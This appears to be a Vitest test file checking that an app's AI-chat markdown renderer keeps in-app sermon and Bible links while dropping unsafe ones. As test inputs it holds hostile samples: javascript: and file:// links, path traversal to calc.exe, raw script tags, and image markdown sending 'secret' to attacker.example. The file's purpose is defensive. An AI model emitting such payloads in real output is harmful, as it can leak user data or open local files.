import { describe, expect, it, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { parseWmbLink } from '@shared/wmb-link';

// Vitest compiles JSX with the classic runtime here (the app build uses the automatic one).
vi.mock('@renderer/hooks/use-wmb-link', () => ({
    parseWmbLink,
    useWmbLinkNavigate: () => vi.fn(),
}));

const { default: AssistantMarkdown, toChatMarkdownUrl } =
    await import('@renderer/views/options/ai-chat/assistant-markdown');

function render(content: string): string {
    return renderToStaticMarkup(<AssistantMarkdown content={content} streaming={false} />);
}

function anchors(html: string): string[] {
    return [...html.matchAll(/<a [^>]*>/g)].map((match) => match[0]);
}

const SERMON_LINK = 'wmb://sermon/63-0318/fr/1/12';

describe('toChatMarkdownUrl', () => {
    it.each([
        [SERMON_LINK, SERMON_LINK],
        ['https://wmb-table.web.app/', 'https://wmb-table.web.app/'],
        ['http://example.com', 'http://example.com/'],
        ['mailto:a@example.com', 'mailto:a@example.com'],
    ])('keeps %s', (url, expected) => {
        expect(toChatMarkdownUrl(url)).toBe(expected);
    });

    it.each([
        '../../../../Windows/System32/calc.exe',
        'file:///C:/Windows/System32/calc.exe',
        'javascript:alert(1)',
        'data:image/png;base64,AAAA',
        '#top',
        'xmpp:a@example.com',
        'irc://irc.example.com',
        '',
    ])('drops %j', (url) => {
        expect(toChatMarkdownUrl(url)).toBeNull();
    });
});

describe('AssistantMarkdown', () => {
    it('keeps wmb:// references as in-app tags, spaces included', () => {
        const html = render(
            `Voir [63-0318 §12](${SERMON_LINK}) et [Jean 3:16](wmb://bible/JHN/3/16/LSG/Jean Évangile).`,
        );

        expect(anchors(html)).toEqual([]);
        expect(html).toContain(`data-href="${SERMON_LINK}"`);
        expect(html).toContain('data-href="wmb://bible/JHN/3/16/LSG/Jean%20%C3%89vangile"');
        expect(html).toContain('63-0318 §12');
    });

    it('opens web and mail links in a new window, which main hands to the OS', () => {
        const html = render('[Docs](https://wmb-table.web.app/) et [Écrire](mailto:a@example.com)');

        expect(anchors(html)).toEqual([
            '<a href="https://wmb-table.web.app/" target="_blank" rel="noopener noreferrer">',
            '<a href="mailto:a@example.com" target="_blank" rel="noopener noreferrer">',
        ]);
    });

    it.each([
        '[Ouvrir](../../../../Windows/System32/calc.exe)',
        '[Ouvrir](file:///C:/Windows/System32/calc.exe)',
        '[Ouvrir](javascript:alert(1))',
        '[Ouvrir](data:text/html,hi)',
        '[Ouvrir](#settings)',
        '[Ouvrir](wmb://unknown/thing)',
        '[Ouvrir][ref]\n\n[ref]: ./local.html',
    ])('renders %j as plain text', (markdown) => {
        const html = render(markdown);

        expect(anchors(html)).toEqual([]);
        expect(html).not.toMatch(/href=|file:|javascript:|calc\.exe/);
        expect(html).toContain('Ouvrir');
    });

    it('never renders an image, so nothing remote loads without a click', () => {
        const html = render(
            '![notes de l’utilisateur](https://attacker.example/x?q=secret) ![](https://attacker.example/y.png)',
        );

        expect(html).not.toContain('<img');
        expect(html).not.toContain('secret');
        expect(html).toContain('notes de l’utilisateur');
        expect(html).toContain('https://attacker.example/y.png');
        expect(anchors(html)).toEqual([]);
    });

    it('drops images with an unsafe source and no description', () => {
        const html = render('![](file:///etc/passwd)');

        expect(html).not.toContain('<img');
        expect(html).not.toContain('passwd');
    });

    it('keeps a linked image as one plain link', () => {
        const html = render('[![Logo](https://example.com/logo.png)](https://example.com/)');

        expect(html).not.toContain('<img');
        expect(anchors(html)).toEqual([
            '<a href="https://example.com/" target="_blank" rel="noopener noreferrer">',
        ]);
        expect(html).toContain('Logo');
    });

    it('does not render raw HTML from the model', () => {
        const html = render(
            '<img src="https://attacker.example/x"> <a href="file:///etc/passwd">x</a> <script>alert(1)</script>',
        );

        expect(html).not.toContain('<img');
        expect(anchors(html)).toEqual([]);
        expect(html).not.toContain('<script');
    });
});
